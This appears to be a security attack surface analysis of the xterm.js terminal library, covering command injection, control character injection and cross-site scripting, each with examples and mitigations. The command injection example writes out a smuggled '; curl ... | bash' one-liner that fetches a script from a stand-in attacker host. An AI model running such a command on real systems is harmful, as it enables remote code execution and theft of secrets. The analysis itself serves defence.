# Attack Surface Analysis for xtermjs/xterm.js

## Attack Surface: [Command Injection via User Input](./attack_surfaces/command_injection_via_user_input.md)

*   **Description:** Attackers inject malicious commands that are executed by the application's backend or the environment where the terminal is used.
    *   **How xterm.js Contributes:** Provides the user interface element through which the attacker can input the malicious commands. Without xterm.js facilitating this input, this specific attack vector wouldn't exist in the same way.
    *   **Example:** A user types ``; curl http://attacker.com/steal_secrets.sh | bash`` into the xterm.js terminal, and the application's backend directly executes this command.
    *   **Impact:** Full system compromise, data breach, denial of service, unauthorized access.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   **Developers:**
            *   **Server-side command validation and sanitization:**  Never directly execute user-provided input as commands. Use parameterized commands or whitelists. This is crucial regardless of how the input is received, but xterm.js is the entry point here.
            *   **Principle of least privilege:** Run terminal-related processes with the minimum necessary privileges to limit the impact of successful command injection.

## Attack Surface: [Control Character Injection](./attack_surfaces/control_character_injection.md)

*   **Description:** Attackers inject ANSI escape codes or other control characters to manipulate the terminal's behavior for malicious purposes.
    *   **How xterm.js Contributes:**  xterm.js is responsible for interpreting and rendering these control characters. This capability allows for the manipulation of the terminal's display and potentially user interaction.
    *   **Example:** Injecting escape codes to clear the screen and display a fake login prompt within the xterm.js terminal to steal credentials.
    *   **Impact:** UI spoofing, information disclosure within the terminal, potentially tricking users into performing actions they wouldn't otherwise.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Developers:**
            *   **Sanitize or strip control characters:** Remove or neutralize potentially harmful control sequences before rendering the output in xterm.js. Configure xterm.js options if available, or implement custom filtering logic.

## Attack Surface: [Cross-Site Scripting (XSS) via Terminal Output](./attack_surfaces/cross-site_scripting__xss__via_terminal_output.md)

*   **Description:** Malicious scripts are present in the data being rendered by xterm.js, and if the application doesn't handle this output correctly when displaying it elsewhere on the page, it can lead to script execution in the user's browser.
    *   **How xterm.js Contributes:** xterm.js renders the raw output, including any potentially malicious script tags or event handlers. While the vulnerability manifests outside of the xterm.js container, the library is the conduit for the malicious content.
    *   **Example:** A command executed on the backend outputs a string containing `<script>alert('XSS')</script>`, and the application displays this output (received from xterm.js) in the browser without proper encoding.
    *   **Impact:** Session hijacking, cookie theft, redirection to malicious sites, defacement, arbitrary actions on behalf of the user.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Developers:**
            *   **Output encoding:** Properly encode terminal output *received from xterm.js* before displaying it in any other part of the web page. Use context-aware encoding (e.g., HTML escaping). Treat the data rendered by xterm.js as potentially untrusted.
